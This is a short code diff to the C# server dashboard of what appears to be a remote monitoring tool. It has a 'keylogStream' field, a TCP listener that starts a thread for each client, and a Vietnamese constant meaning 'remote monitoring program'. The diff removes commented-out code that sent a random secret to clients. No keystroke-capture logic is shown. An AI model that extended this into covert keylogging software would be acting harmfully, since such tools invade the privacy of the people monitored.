@@ -28,9 +28,7 @@ namespace Server
         private NetworkStream keylogStream;
         private readonly Thread Listening;
 
-        
-
-
+        const string KEY = "CHƯƠNG TRÌNH THEO DÕI TỪ XA";
         public DashBoard()
         {
             CheckForIllegalCrossThreadCalls = false;
@@ -39,8 +37,11 @@ namespace Server
             Listening.IsBackground = true;
             InitializeComponent();
         }
+
+
         private void StartListening()
         {
+            
             try
             {
                 server.Start();
@@ -59,21 +60,6 @@ namespace Server
                     Thread Handle = new Thread(HandleClient);
                     Handle.IsBackground = true;
                     Handle.Start();
-                    //Random random = new Random();
-                    //int length = 10;
-                    //var secret = "";
-                    //for (var i = 0; i < length; i++)
-                    //{
-                    //    secret += ((char)(random.Next(1, 26) + 64)).ToString();
-
-                    //}
-                    //mainStream = client.GetStream();
-                    //Byte[] sendsecret = Encoding.ASCII.GetBytes("secrete:" + secret + "$");
-                    //mainStream.Write(sendsecret, 0, sendsecret.Length);
-
-                    //MessageBox.Show(secret);
-
-
                 }
 
             }
